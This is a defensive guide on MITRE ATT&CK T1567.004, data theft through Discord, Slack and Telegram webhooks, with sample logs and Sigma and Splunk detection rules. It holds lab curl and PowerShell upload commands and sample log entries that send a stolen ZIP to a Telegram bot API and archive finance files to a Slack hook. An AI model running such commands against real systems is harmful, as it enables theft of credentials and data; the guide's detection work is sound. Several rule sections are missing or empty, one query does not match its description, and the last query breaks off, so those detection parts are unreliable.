T1567.004 Exfiltration Over Webhook

Stolen data is posted straight into an attacker's chat channel using a webhook — a one-way "post here" URL (a web address that accepts uploads) from services like Discord, Slack, or Telegram. The data lands where criminals are already looking: their own chat apps, on their phones. This guide shows how the trick works in a safe lab, what traces it leaves, and how to build detections that catch it.

Tactic: Exfiltration ID: T1567.004 Parent: T1567 Platforms: ESXi · Linux · Office Suite · SaaS · Windows · macOS Type: Sub-technique ATT&CK data: Version 1.2 · created 20 July 2023 · last modified 12 May 2026
What happens

An HTTP POST (the web's standard upload request) carries files or text to a chat webhook URL over the normal, encrypted web traffic every company already allows.

Chain position

The final stage of an attack — and the favorite drop point of commodity info stealers that harvest browser data.

Biggest risk

Chat domains are widely trusted, and one webhook URL is a permanent, free drop box that needs no attacker server.

Detect with

DNS/SNI records (domain lookups and the service name inside encrypted connections) to chat APIs, webhook-URL patterns in command lines and script blocks, and first-seen egress from a host.

Overview

What "exfiltration over webhook" means, why attackers love it, and what you will learn on this page.

A webhook is a special URL that a chat service gives you so programs can post messages into your channel. You send an HTTP POST request — the web's standard upload request — to the URL, and the service turns that request into a message in the channel. Discord, Slack, Microsoft Teams, and Telegram all offer webhooks or similar "bot post" features for programs, through their APIs (application programming interfaces). The URL is designed to accept data from the outside — that is its whole job.

MITRE ATT&CK tracks this behavior as T1567.004 — Exfiltration Over Webhook, a sub-technique of T1567 Exfiltration Over Web Service. Instead of renting a server, the attacker creates a free webhook in a chat workspace they control. Malware on a victim machine then POSTs stolen files or text straight to that URL. The stolen data shows up as a chat message with attachments, ready to read on the attacker's phone. Two real cases are listed on the ATT&CK page for this technique. The Shai-Hulud worm (S9008) posted stolen repository secrets to a webhook receiver. The 2025 Poland Wiper Attacks (C0063) used an attacker-controlled Slack channel to move data out. ATT&CK records the technique as created on 20 July 2023 and last modified on 12 May 2026.

Why it matters: most companies allow traffic to chat and SaaS (software-as-a-service) domains, because people need them for work. Webhook traffic uses normal HTTPS (encrypted web traffic), it goes to a trusted domain, and it needs no malware infrastructure at all. A single pasted URL is all the "server" an attacker needs — and it keeps working until someone reports or deletes it. That makes this technique cheap, quiet, and very popular with info stealers.

Where it sits in the attack chain

Exfiltration is the last step of the ATT&CK chain. Before it, the attacker (or malware) has already run code on the machine (Execution). It has collected interesting data (Collection — often browser passwords, cookies, tokens, and files). And it has prepared the data for transfer (Archive Collected Data, often a small ZIP archive). T1567.004 is simply the moment the data actually leaves: the packaged data is pushed out through the webhook. Because it is so late in the chain, catching it here is your last chance to stop the data. The traces it leaves (DNS, SNI, process lines, file events) are also excellent early-warning signals for the whole infection.

What an attacker does

  1. Create a chat workspace and a webhook (free, takes one minute).
  2. Embed that webhook URL in a stealer, loader, script, or build job.
  3. The malware collects data, packs it, and POSTs it to the URL.
  4. Read the loot in the chat channel — files and text arrive as messages.

What a defender sees

  1. DNS or SNI connections to chat APIs from odd processes.
  2. Command lines or script blocks containing the webhook URL.
  3. A small archive created in %TEMP% right before the POST.
  4. Sometimes: nothing at all until the stolen data is abused later.

The story, step by step

  1. A fake installer. The user downloads a cracked-game installer from an untrusted download site. The file itself is not yet blocked; a file-reputation service later flags it in a retrospective verdict. Defender: a retrospective file-reputation flag lands in a queue that nobody has read yet. Evidence: file reputation.
  2. The stealer wakes up. The installer drops and starts a second, unsigned binary in %TEMP%. It runs silently in the user's own context — no UAC (user account control) prompt, no admin rights needed. Defender: EDR shows an unsigned binary in %TEMP% spawned by the installer. Evidence: EDR binary event.
  3. Collecting the harvest. The stealer reads the browser password store, the cookie database, saved chat-app login tokens, and wallet folders. Nothing is sent anywhere yet. Defender: EDR logs the process opening browser credential-store and cookie files — a rare access pattern for a normal app. Evidence: browser-store file reads.
  4. Packing. The stealer zips the loot into a small archive such as log_WORKSTATION01.zip in %TEMP%. Defender: an archive-create event appears right after the browser-file reads — the timing is the signal. Evidence: ZIP create.
  5. The webhook POST. The stealer sends one multipart POST to https://discord.com/api/webhooks/<id>/<token> (the ID and token shown here are fake). The connection is normal HTTPS to a trusted domain. Defender: DNS logs show a first-seen lookup of discord.com from a non-browser process, and the proxy logs a TLS (transport-layer security) SNI row. Evidence: DNS first-seen, SNI/proxy row.
  6. Files land in the attacker's channel. The webhook turns the POST into chat messages: log.zip plus a text file of credentials. The attacker reads them on a phone within minutes. Defender: nothing at all — no alert fires, because the data is already outside. This is the blind spot of the technique. Evidence: no telemetry (data already gone).
  7. Abuse begins. The attacker replays a stolen session cookie and signs in to the victim's webmail from another country. Defender: the identity provider raises an impossible-travel sign-in alert — often the first loud signal, hours after the theft. Evidence: impossible-travel alert.
  8. SOC verdict. The analyst connects DNS first-seen → the process that resolved it → the %TEMP% archive and declares an info-stealer incident. The team blocks chat-API egress for workstations and starts a full credential reset. Defender: an egress policy is deployed and a password-manager rollout is scheduled. Evidence: egress policy.

What the nodes mean

  • Attacker (channel owner) — the criminal who created the Discord server and the webhook, and who reads the stolen data in the channel.
  • User PC (victim) — the workstation where the fake installer ran; it hosts the stealer process, the %TEMP% archive, and the browser stores being read.
  • Discord API — the legitimate chat service; it receives the webhook POST and delivers files into the attacker's channel as normal messages.
  • Mail / SaaS — the victim's cloud email; in step 7 the attacker signs in with a stolen session cookie.
  • SOC (EDR · DNS · proxy) — the defenders' view: endpoint telemetry, resolver logs, and secure web gateway records, shown in the defender panel under the canvas.

✓ Good practice. Notice that steps 3–5 produce a tight time chain: browser-file reads → archive create → first-seen DNS → POST. Correlating those four events within a few minutes on one host is the single strongest detection story for this technique.

Red Team / Hacker Perspective

Why attackers pick webhooks, what they need first, and how a harmless lab version works.

When, where, and why attackers use it

Webhook exfiltration is attractive for simple reasons: it is free, fast, and hard to notice inside normal SaaS traffic. Public reporting has widely documented commodity info-stealer families using Discord webhooks and Telegram bots as their default drop point between 2021 and 2024, and the pattern continues today.

Where does it appear? On any host that can reach a chat API: user workstations running stealers, build runners shipping artifacts, servers moved by intruders, and SaaS or Office add-ins acting on their own. The timing follows the data. Stealers fire within minutes of infection. Ransomware groups upload small proof-of-data samples late in an intrusion, just before encryption. Insiders trickle files out slowly to avoid thresholds. The advantages from the attacker's point of view:

  • No server to buy or hide. A webhook URL is created in a minute inside a chat account, and the chat provider keeps it online. There is no attacker IP (internet address) to block, no domain to register, and no certificate to manage.
  • Trusted destination. discord.com, slack.com, and api.telegram.org are high-reputation domains with valid TLS. Naive "block bad domains" lists never contain them.
  • Files and text in one POST. A single multipart request can carry the ZIP archive plus a caption naming the victim machine, so the attacker can sort loot per victim.
  • Read anywhere. The data appears as chat messages on the attacker's phone — no log in, no special tooling, perfect for quick resale of credentials.

Prerequisites

The technique needs surprisingly little. From the victim side, only two things matter. First, the malware runs in a user context that may reach the internet. Second, egress to the chat API host is allowed by the network policy. From the attacker side, one chat account and one webhook URL (or a bot token for Telegram) are enough. That is the entire checklist — which is exactly why it works so often.

⚠ Danger — LAB-ONLY. Never send data to a webhook you did not create yourself. In these examples the webhook belongs to a Discord or Slack workspace you made for testing, on machines you own, with sample files you wrote. Doing this against anyone else's systems or with real third-party data is illegal and unethical.

Lab test · cURL: post a file to your own webhook.
# 1. Create a private test workspace and a webhook channel in it.
# 2. Save that webhook URL in a shell variable — never paste a real
#    token into scripts, screenshots, or shared notes:
LAB_WEBHOOK_URL=""
# 3. From your own lab VM, post a harmless sample file you wrote:
curl -F "content=lab test from my own VM" \
     -F "file=@sample.txt" \
     "$LAB_WEBHOOK_URL"
Lab test · PowerShell: the same POST from Windows.
# Still your own webhook, your own VM, your own sample file.
$boundary = [System.Guid]::NewGuid().ToString()
$form = @{ file = Get-Item .\sample.txt; content = "lab test" }
Invoke-RestMethod -Method Post -Uri $env:LAB_WEBHOOK_URL -Form $form

Mistakes attackers and their tooling make

  • Hard-coding the webhook URL in clear text. The full URL sits in the binary, script, or command line. Any scanner, sandbox, or SIEM (security information and event management) rule that greps for discord.com/api/webhooks/ finds the whole campaign at once.
  • No cleanup of the temp ZIP. The archive stays in %TEMP% with victim-naming patterns like log_HOSTNAME.zip, giving responders a clean forensic artifact.
  • Reusing one webhook across campaigns. Once that URL appears in one report, every future sample using it is linked — and providers can shut the channel down after disclosure.

🛈 Note — defender takeaway. Every "advantage" above is also a detection opportunity. Free and stable means the URL persists in logs; trusted domains means first-seen DNS per host stands out; one POST means a single, well-shaped event to match on.

Blue Team / SOC Perspective

What webhook exfiltration looks like in your telemetry, which artifacts it leaves behind, and a five-step triage flow you can follow.

From the defender's side, this technique is a story of almost-missing it. The POST itself is encrypted HTTPS to a trusted domain, so content inspection often sees nothing useful. What saves you are the edges of the event. One edge is a resolver question nobody asked before. Another is a process line that happens to contain a webhook URL. A third is a ZIP archive that appears seconds before the connection. None of those edges is loud on its own. Together, in a time chain on one host, they are one of the clearest detection stories in endpoint security.

Where to look first

  • DNS layer: which hosts resolved chat API domains in the last 24 hours, and which process made the resolution? A workstation with a browser visit to Discord is normal; svchost, curl, or an unsigned exe doing it is not.
  • Proxy layer: filter on the path pattern /api/webhooks/ and on Telegram's /bot<token>/ path. The domain alone is noisy; the path is much tighter.
  • Endpoint layer: chain file events and network events per process. A process that wrote an archive and, within a minute, opened a connection to a chat API deserves an incident ticket, not a glance.
  • Identity layer: for any confirmed stealer, treat every browser-saved password and cookie as compromised and check for sign-in abuse immediately.

Why it matters for the whole chain

Catching T1567.004 late is still catching it. The exfil event tells you code execution happened, collection happened, and — for stealer families — that credentials and cookies are now stolen goods. That single detection triggers identity response, password resets, session revocation, and estate-wide hunting. Missing it usually means the first alert arrives days later from a fraud report or an impossible-travel event, when the data has already been sold.

Triage flow

  1. DNS first-seen. Confirm the host queried a chat API domain for the first time recently. Check whether a browser did it (benign) or another process (interesting).
  2. Identify the process. Pull the EDR process tree for the resolving process: image path, hash, signer, parent. Unsigned binaries in %TEMP% or user-writable folders are the red flag.
  3. Look for the temp archive. Search file events for ZIPs created by that process in the minutes before the POST. Capture one sample (in a safe location) for the report.
  4. Scope the credential reset. If it is an info stealer, assume all browser-saved passwords, cookies, and tokens on that host are stolen. Start resets from a clean device — never from the infected one.
  5. Block and hunt estate-wide. Block chat-API egress for workstations per policy, then hunt the URL pattern (for example discord.com/api/webhooks/) across DNS, proxy, EDR, and script logs for the whole environment.

✓ Good practice. Write the triage flow into your incident-response plan before an incident. During a live stealer event, a team that has practiced this flow saves hours and resets the right accounts first. The flow is: DNS first-seen → process → archive → reset scope → block + hunt.

Detection Engineering Deep Dive

The practical heart of this guide: regulation mapping, threat intelligence, ranked threats, the logs that expose them, and ready-to-adapt Sigma and Splunk rules.

Detection for webhook exfiltration stands on three pillars. First, know your normal egress — which hosts may talk to which chat APIs. Second, log the edges — DNS, SNI, process lines, script blocks, and file events. Third, match the URL shape — webhook paths and token patterns that normal chat browsing never produces. Everything below serves those three ideas. If you only take one thing away: the domain is not the detection — the combination of process, path, and first-seen behavior is.

5.2 Threat intelligence

Good detections start from reported reality. Collection means pulling fresh reporting into one place. Analysis means asking: which chat services, which URL shapes, which processes, which file names? Application means turning those answers into allow-lists, first-seen baselines, and the regexes you will see in 5.5. Intel that never reaches a rule or a policy is decoration.

Useful collection sources: the MITRE ATT&CK site and its STIX/TAXII (standard threat-intelligence exchange formats) feeds. Vendor blogs: Microsoft, Mandiant, CrowdStrike, ESET, Kaspersky, Red Canary. OSINT (open-source intelligence) repositories: abuse.ch, Any.run, malware-traffic-analysis.net, vx-underground. Commercial feeds: Recorded Future, VirusTotal. Sector ISACs (information sharing and analysis centers): MS-ISAC, FS-ISAC, H-ISAC, E-ISAC, or ICS-ISAC as relevant. And your own internal telemetry — past incidents, honeypots, and EDR history.

Every URL, ID, and token-like value in these examples is a placeholder — nothing on this page is a real channel, bot, workspace, or secret.

Threat 1 · Info stealer → Discord webhook (credentials and cookies)

Log sources and key fields: DNS/resolver logs (clientIp, queryHostname, queryType, processImage if enriched by EDR). Sysmon Event ID 1 (Image, CommandLine, ParentImage, Hashes). Sysmon Event ID 11 (TargetFilename, Image). Sysmon Event ID 3 (DestinationHostname, DestinationPort, ProcessGuid). Proxy/SWG logs (r-dns, c-uri-path, bytes).

Normal behavior: browsers and update agents resolve discord.com or slack.com; a handful of known processes do so on predictable schedules. Suspicious behavior: a first-seen resolution for the host comes from a non-browser, unsigned, or %TEMP%-located process. It is followed within minutes by an archive write and a POST.

Detection logic: alert when a host's first-ever DNS resolution of a chat API domain originates from a non-browser process. Also alert when a process command line matches the webhook URL pattern discord\.com/api/webhooks/[0-9]+/[\w-]+, especially within 10 minutes of a ZIP creation by the same process.

Example · DNS query log (JSON, enriched)
{
  "ts": "2025-04-17T09:41:22.118Z",
  "clientIp": "10.22.7.41",
  "hostname": "FIN-WS-0341",
  "query": "discord.com",
  "queryType": "A",
  "answer": ["162.159.135.232"],
  "firstSeenForClient": true,
  "process": {
    "image": "C:\\Users\\jmalone\\AppData\\Local\\Temp\\log_helper.exe",
    "pid": 7412,
    "signed": false
  },
  "responseCode": "NOERROR"
}
  • firstSeenForClient: true — this host never resolved discord.com before; the SIEM built this flag from 30 days of history.
  • process.image — an unsigned binary in %TEMP%; browsers never resolve from this path.
  • hostname — the workstation identity; join it to the EDR process tree next.
  • ts — the timestamp anchors the chain: expect archive-create and proxy POST events within ±3 minutes.

Threat 2 · Loader/bot → Telegram bot API

Log sources and key fields: Sysmon Event ID 1 (CommandLine, Image, ParentImage). Proxy logs (urlHost, c-uri-path, requestMethod, bytesOut). EDR network events (DestinationHostname, ProcessId).

Normal behavior: almost none from servers; from workstations, only approved messaging apps resolve api.telegram.org. Suspicious behavior: curl, PowerShell, or an unsigned binary touching /bot paths. Also a command line containing a token-shaped string [0-9]{8,10}:[\w-]{30,} — a bot token looks like a number, a colon, then a long alphanumeric string. Treat the shape as sensitive, exactly like a password.

Detection logic: alert on process creation or proxy requests where the command line or URI path contains api.telegram.org/bot followed by a token-shaped string. On servers, alert on any egress to api.telegram.org at all.

Example · Sysmon Event ID 1 — process create (XML, abbreviated)
<Event>
  <System>
    <Provider Name="Microsoft-Windows-Sysmon"/>
    <EventID>1</EventID>
    <TimeCreated SystemTime="2025-04-17T09:42:03.551Z"/>
  </System>
  <EventData>
    <Data Name="Image">C:\Windows\System32\curl.exe</Data>
    <Data Name="CommandLine">curl -s -X POST "https://api.telegram.org/bot<bot-id>:<bot-token>/sendDocument" -F "chat_id=<chat-id>" -F "document=@C:\Users\jmalone\AppData\Local\Temp\log_FIN-WS-0341.zip"</Data>
    <Data Name="ParentImage">C:\Users\jmalone\AppData\Local\Temp\log_helper.exe</Data>
    <Data Name="User">CORP\jmalone</Data>
    <Data Name="Hashes">SHA256=9F2C1A8D4E7B6035A1C8D2E4F6B8A0C3D5E7F9A1B2C4D6E8F0A2C4D6E8F0B2D4</Data>
  </EventData>
</Event>
  • CommandLine — the full bot path with token and sendDocument; the bot ID and token here are placeholders, but their shape is what the regex matches.
  • ParentImage — the parent is the %TEMP% stealer from threat 1; the parent-child link joins the two detections.
  • Image — curl.exe is legitimate but unusual as a user-context child of a temp binary.
  • document=@…zip — the archive created moments earlier is now leaving the host.

Threat 3 · Compromised CI runner → attacker webhook

Log sources and key fields: proxy/SWG logs (srcIp, urlHost, urlPath, requestMethod, userAgent, bytesOut). Cloud/CI audit logs (actor, jobName, repository, stepName). DNS logs (clientIp, query). EDR on runners, where available.

Normal behavior: runners talk to package registries, git remotes, and cloud APIs. Suspicious behavior: any runner egress to a chat API or generic receiver, especially mid-job, plus webhook URLs appearing in job logs or dependency scripts.

Detection logic: alert when a build-runner subnet or service identity makes an egress connection to a chat API or paste/webhook receiver domain. Also review CI job logs for webhook URL patterns during dependency resolution steps.

Example · proxy/SWG log row (JSON)
{
  "ts": "2025-04-17T11:03:54Z",
  "srcIp": "10.44.8.17",
  "srcZone": "build-runners",
  "method": "POST",
  "urlHost": "discord.com",
  "urlPath": "/api/webhooks/<id>/<token>",
  "userAgent": "Go-http-client/2.0",
  "contentType": "multipart/form-data",
  "bytesOut": 48211,
  "category": "chat",
  "action": "blocked_by_policy"
}
  • srcZone: build-runners — the source is a CI subnet, not a user workstation; chat egress from it has no business case.
  • urlPath — the webhook path pattern; proxy logs are the only place this path is visible in the clear.
  • userAgent: Go-http-client — a default library user agent, typical of scripted exfil inside a job step.
  • action: blocked_by_policy — the egress allow-list stopped it; the DNS+SNI record alone would still prove intent.

Threat 4 · Insider script → private webhook

Log sources and key fields: PowerShell operational log Event ID 4104 (ScriptBlockText, ScriptBlockId, Path, runspace). Bash history and auditd (comm, exe, cmdline) on Linux. DLP alerts (rule, user, destination, fileName). EDR process events.

Normal behavior: admins use PowerShell and curl constantly; most script blocks contain no external URLs at all. Suspicious behavior: script text containing a webhook URL (Discord, Slack hooks, generic receivers) combined with file-read loops or export commands such as CSV (spreadsheet) exports and Compress-Archive.

Detection logic: alert on script-block or shell-history content matching chat-webhook URL patterns, prioritized when the same session also reads data exports or creates archives.

Example · PowerShell Event ID 4104 — script block log (XML, abbreviated)
<Event>
  <System>
    <Provider Name="Microsoft-Windows-PowerShell"/>
    <EventID>4104</EventID>
    <TimeCreated SystemTime="2025-04-17T16:22:41.004Z"/>
  </System>
  <EventData>
    <Data Name="ScriptBlockText">$files = Get-ChildItem '\\fileserver\finance\Q2-forecast*' ; Compress-Archive -Path $files -DestinationPath $env:TEMP\q2.zip -Force ; $form = @{file = Get-Item $env:TEMP\q2.zip} ; Invoke-RestMethod -Method Post -Uri "https://hooks.slack.com/services/<workspace-id>/<channel-id>/<token>" -Form $form</Data>
    <Data Name="ScriptBlockId">7c4f2a10-93bb-4e02-a15c-6d8e0f9a3b21</Data>
    <Data Name="Path"></Data>
    <Data Name="User">CORP\jmalone</Data>
  </EventData>
</Event>
  • ScriptBlockText — the full script survives even if it never touched disk; the Slack hook URL is plainly visible.
  • Get-ChildItem … Compress-Archive — the read-then-archive-then-post chain in one line is the insider signature.
  • Path is empty — meaning the code ran interactively or was pasted, not loaded from a file.
  • User — the identity to interview; combine with DLP file events for the data classification.

Threat 5 · Malicious browser extension → webhook

Log sources and key fields: browser enterprise logs / extension activity logs (extensionId, extensionName, tabUrl, requestUrl, method). Proxy logs (userAgent, urlHost, urlPath). EDR browser-process network events. Extension inventory from device management.

Normal behavior: extensions talk to their own update hosts and service APIs, on modest volumes. Suspicious behavior: an extension posting page content or form data to an unrelated chat/receiver domain. Also sudden spikes per extension, or any extension whose permission set (read and change all data on all sites) does not match its function.

Detection logic: alert when an extension's network egress includes a chat-API webhook path, or when per-extension egress volume to non-update domains jumps sharply above its 30-day baseline.

Example · browser extension network log (JSON, enterprise browser export)
{
  "ts": "2025-04-17T10:15:09Z",
  "user": "jmalone@corp.example",
  "browser": "chrome/124.0.6367.91",
  "extensionId": "apghjkldoeifakeexampleid0000000000",
  "extensionName": "Quick Coupon Finder",
  "triggerTab": "https://intranet.corp.example/finance/forecast",
  "request": {
    "method": "POST",
    "url": "https://discord.com/api/webhooks/<id>/<token>",
    "contentType": "application/json",
    "bodyPreview": "{\"content\":\"page: forecast | user: jmalone | tables: 4\"}"
  }
}
  • extensionId — the stable ID to block via browser policy; the name "Quick Coupon Finder" explains nothing about needing intranet access.
  • triggerTab — the page the extension read; here it is an internal finance page, proving content theft.
  • bodyPreview — page text packaged as a chat message; generic "coupon" extensions never post JSON bodies like this.
  • url — again the webhook path pattern; the same regex family as threats 1 and 3 applies.

Threat 6 · Ransomware pre-encryption sample → webhook API

Log sources and key fields: Sysmon Event ID 11 (TargetFilename, Image, CreationUtcTime). Sysmon Event ID 3 and firewall logs (DestinationHostname, DestinationPort, bytesOut). Proxy logs (bytesOut, method, urlHost). EDR archive/behavior telemetry.

Normal behavior: servers rarely create ZIPs in bulk or speak to chat APIs at all. Suspicious behavior: small archive creations by server processes (or archive tools spawned by admin services), followed by modest POSTs to chat or receiver domains. This is the "proof sample" pattern before large-scale encryption.

Detection logic: alert when a server host creates one or more small archives (.zip, .7z). The archive must fall within 15 minutes of any egress connection to a chat API or generic receiver domain. Judge the match regardless of bytes transferred.

Example · Sysmon Event ID 11 — file create (XML, abbreviated)
<Event>
  <System>
    <Provider Name="Microsoft-Windows-Sysmon"/>
    <EventID>11</EventID>
    <TimeCreated SystemTime="2025-04-17T02:31:12.870Z"/>
  </System>
  <EventData>
    <Data Name="Image">C:\Windows\Temp\wuaupd.exe</Data>
    <Data Name="TargetFilename">C:\Windows\Temp\db_sample_FINDB01.7z</Data>
    <Data Name="CreationUtcTime">2025-04-17 02:31:12.801</Data>
  </EventData>
</Event>
  • Image — a fake "Windows update"-named binary running from Temp on a database server: classic intruder tooling.
  • TargetFilename — a small, named sample of the finance database; the _sample_ naming echoes the proof-of-data pattern.
  • .7z — archives on servers are rare; pair this event with the network event that follows it.
  • 02:31 UTC — 2 a.m. local time in universal coordinated time (UTC); the hour alone justifies a look at the host's full 24-hour timeline.

5.5 Sigma rules and Splunk SPL

One Sigma rule and one Splunk query per threat from 5.3. Two additions follow: a DNS first-seen companion rule for Threat 1 (Rule 7), and a companion join query for Rule 6. The Sigma rules use the standard process/network/file/script data models, so they port to Elastic, Sentinel, or Splunk converters with minimal edits. The SPL examples assume these indexes: index=sysmon with sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational, index=wineventlog, index=proxy, index=dns, index=edr, and index=cloud — adapt index and sourcetype names to your environment before running anything. All webhook IDs and tokens in this section are fake examples.

Rule 1 · Discord webhook URL in a process command line (Threat 1)

Severity: high. This is the core stealer detection. It matches the exact URL shape attackers embed in binaries and scripts; browsers are filtered out to keep the alert clean.

Sigma · discord_webhook_in_cmdline.yml
title: Suspicious Discord Webhook URL in Process Command Line
id: 7c1e4a2f-9b3d-4e86-a51c-0d2f6b8e4a17
status: experimental
description: Detects process creations whose command line references a Discord
  webhook URL, a common exfiltration channel for info stealers and loaders.
references:
  - https://attack.mitre.org/techniques/T1567/004/
  - https://discord.com/developers/docs/resources/webhook
author: SOC Guide Builders
date: 2025-02-11
logsource:
  category: process_creation
  product: windows
  service: sysmon
detection:
  selection:
    CommandLine|contains|all:
      - 'discord.com'
      - '/api/webhooks/'
  filter_browsers:
    Image|endswith:
      - '\chrome.exe'
      - '\msedge.exe'
      - '\firefox.exe'
  condition: selection and not filter_browsers
fields:
  - Image
  - CommandLine
  - ParentImage
  - User
  - Hashes
falsepositives:
  - Approved internal automation that posts build or monitor notices to a company
    Discord channel via a documented webhook.
  - Security tooling that quarantines or analyzes malicious URLs in a command line.
level: high
tags:
  - attack.exfiltration
  - attack.t1567.004
  - attack.execution

Mapping: process_creation maps to Sysmon Event ID 1; on Splunk the fields arrive as CommandLine, Image, ParentImage from the XmlWinEventLog sourcetype. False positives: documented DevOps or monitoring webhooks; add them to an allow-list keyed on the exact channel ID. Tuning: pin the regex to a channel ID you know is attacker-owned when hunting a specific campaign. Add a ParentImage filter for your approved automation hosts. Raise the severity to critical if the parent process is unsigned and in a user-writable path.

Splunk SPL · Discord webhook in command lines
index=sysmon sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=1
    CommandLine="*discord.com*" CommandLine="*/api/webhooks/*"
| search NOT Image IN ("*\\chrome.exe","*\\msedge.exe","*\\firefox.exe")
| stats min(_time) as first_seen max(_time) as last_seen count as events
        values(Image) as images values(ParentImage) as parents values(User) as users
        by Computer
| eval first_seen=strftime(first_seen,"%Y-%m-%d %H:%M:%S")
| sort - events

The two wildcard filters mirror the Sigma contains|all pair exactly, and the NOT filter mirrors filter_browsers. Rolling up by Computer is presentation only — the Sigma fires per event, and so does the alert condition here. Replace index=sysmon and the sourcetype with your names.

Rule 2 · Telegram bot API token in command line or proxy path (Threat 2)

Severity: high. Bot tokens in URLs are both the detection and the incident response target: report the token to Telegram to kill the channel. The regex matches the token shape, not one specific token.

Sigma · telegram_bot_api_exfil.yml
title: Telegram Bot API Endpoint with Token-Shaped String
id: 2f8d6b31-4c57-4a29-9e1a-83f0c7d5b6e2
status: experimental
description: Detects command lines or proxy activity referencing the Telegram bot
  API with a token-shaped string, used by loaders and stealers to report and exfiltrate.
references:
  - https://attack.mitre.org/techniques/T1567/004/
  - https://core.telegram.org/bots/api
author: SOC Guide Builders
date: 2025-02-11
logsource:
  category: process_creation
  product: windows
  service: sysmon
detection:
  selection_token:
    CommandLine|re: 'api\.telegram\.org/bot[0-9]{8,10}:[A-Za-z0-9_-]{30,}'
  selection_plain:
    CommandLine|contains: 'api.telegram.org/bot'
  condition: 1 of selection_*
fields:
  - Image
  - CommandLine
  - ParentImage
  - User
falsepositives:
  - Approved alerting scripts that post to a corporate Telegram bot; document the
    token prefix and allow-list it.
level: high
tags:
  - attack.exfiltration
  - attack.t1567.004
  - attack.command_and_control
  - attack.t1105

Mapping: same process-creation model as Rule 1. A proxy-side companion swaps the logsource for category: proxy and matches the URI path instead of the command line. Add it as a second query if you want network-side coverage. False positives: approved bots used by monitoring or on-call tooling. Tuning: allow-list your corporate bot token prefix (bot<your-bot-id>: without the secret part). On servers, alert on any api.telegram.org contact regardless of shape. Treat any captured token as a secret and report it to the provider.

Splunk SPL · Telegram bot token pattern (process + proxy)
index=sysmon sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=1
    CommandLine="*api.telegram.org/bot*"
| eval token_shaped=if(match(CommandLine,"api\\.telegram\\.org/bot[0-9]{8,10}:[A-Za-z0-9_-]{30,}"),"yes","no")
| stats count as events min(_time) as first_seen max(_time) as last_seen
        values(Image) as images values(ParentImage) as parents values(User) as users
        values(token_shaped) as token_shape by Computer
| sort - events

The base filter mirrors the Sigma condition (1 of selection_*) exactly. Any command line containing api.telegram.org/bot fires, token-shaped or not, because the token regex is a subset of the plain match. The token_shaped column flags which hits match the full token shape. For the proxy branch, run the same pattern against index=proxy with match(urlPath,...); adjust sourcetype=bluecoat:proxysg:access:http to your proxy sourcetype.

Rule 3 · Build-runner egress to chat APIs and webhook receivers (Threat 3)

Severity: high. The CI variant is caught best at the network layer, because runners should have a short, explicit egress allow-list. Any chat API or generic receiver from a runner subnet is a finding by policy, not just by pattern.

Sigma · ci_runner_chat_egress.yml
title: Build Runner Egress to Chat API or Webhook Receiver
id: 5a9c0d84-1e3f-4b76-b28d-6c4e9f1a3b05
status: experimental
description: Detects proxy traffic from build or CI infrastructure to chat APIs and
  generic webhook receivers, a pattern seen in supply-chain exfiltration such as the
  Shai-Hulud npm worm.
references:
  - https://attack.mitre.org/techniques/T1567/004/
author: SOC Guide Builders
date: 2025-02-12
logsource:
  category: proxy
  product: any
  service: proxy
detection:
  selection_webhook_path:
    c-uri|contains: '/api/webhooks/'
  selection_chat_hosts:
    r-dns|endswith:
      - 'discord.com'
      - 'api.telegram.org'
      - 'hooks.slack.com'
      - 'webhook.site'
      - 'pipedream.net'
  condition: selection_webhook_path or selection_chat_hosts
fields:
  - srcIp
  - c-uri
  - r-dns
  - useragent
  - bytes
falsepositives:
  - An approved CI job that posts deployment notices to a team chat channel; allow-list
    the exact destination path and job identity.
level: high
tags:
  - attack.exfiltration
  - attack.t1567.004

Mapping: category: proxy maps to any SWG or forward-proxy log; the field names (c-uri, r-dns) follow the common Sigma proxy conventions and translate directly in the SPL example. False positives: legitimate deploy bots and status postings. Tuning: restrict the rule to your runner CIDR (IP-range) values or service identities in the SIEM layer — see the note under the query. Prefer matching the path over the domain alone. Treat any hit from a server subnet as policy-review-worthy even when a bot owns it.

Splunk SPL · chat API or webhook receiver from any source
index=proxy sourcetype=bluecoat:proxysg:access:http
    (urlHost IN ("discord.com","api.telegram.org","hooks.slack.com","webhook.site","pipedream.net")
     OR urlPath="*api/webhooks*")
| stats count as events sum(bytes_out) as bytes_out max(_time) as last_seen
        values(urlPath) as paths values(useragent) as agents by srcIp, urlHost
| sort - bytes_out

The base query mirrors the Sigma exactly: chat hosts (Sigma's r-dns is urlHost here) or any /api/webhooks/ path, with no source filter. Add the production filter from the tuning note on top when you run it: | where cidrmatch("10.44.8.0/24",srcIp) OR cidrmatch("10.44.9.0/24",srcIp). Replace the ranges with your real runner subnets, and the sourcetype with your proxy's. Field names assume a CIM (Splunk's Common Information Model) style proxy extraction.

Severity: high. Script-block logging (Event ID 4104) catches exfiltration code that never touches disk. This is the core insider-and-script detection and pairs naturally with DLP alerts on the same user.

Severity: medium. On its own this rule is noisy — people legitimately use Discord and Slack in browsers. Its value comes from joining it with extension telemetry (which extension spoke) and volume baselines (which extension suddenly spoke a lot).

Run it as a separate scheduled search instead of hiding it in the alert path, so this query stays logically equivalent to the Sigma.

Rule 6 · Small archive on a server followed by chat-API egress (Threat 6)

Severity: high. The pre-encryption sample is a two-step story: an archive appears where archives never appear, then a small POST leaves. Sigma expresses the first step cleanly. The first SPL query below mirrors it one-to-one; the second joins both steps in one 15-minute window per host.

Sigma · server_archive_outside_userprofiles.yml

Splunk SPL · archive created outside user profiles (Sigma equivalent)
index=sysmon sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=11
    (TargetFilename="*.zip" OR TargetFilename="*.7z") NOT TargetFilename="C:\\Users\\*"
| stats count as events min(_time) as first_seen max(_time) as last_seen

This query mirrors the Sigma one-to-one: archive extension, user-profile exclusion, per-host roll-up. It fires per event like the Sigma does.

Splunk SPL · companion join — archive-create then chat-API POST within 15 minutes
(index=sysmon sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=11
    (TargetFilename="*.zip" OR TargetFilename="*.7z") NOT TargetFilename="C:\\Users\\*")
OR (index=proxy sourcetype=bluecoat:proxysg:access:http
    urlHost IN ("discord.com","api.telegram.org","hooks.slack.com","webhook.site"))
| eval artifact=coalesce(host, srcIp)
| eval archive_ev=if(EventCode=11 AND (like(TargetFilename,"%.zip") OR like(TargetFilename,"%.7z")),1,0)
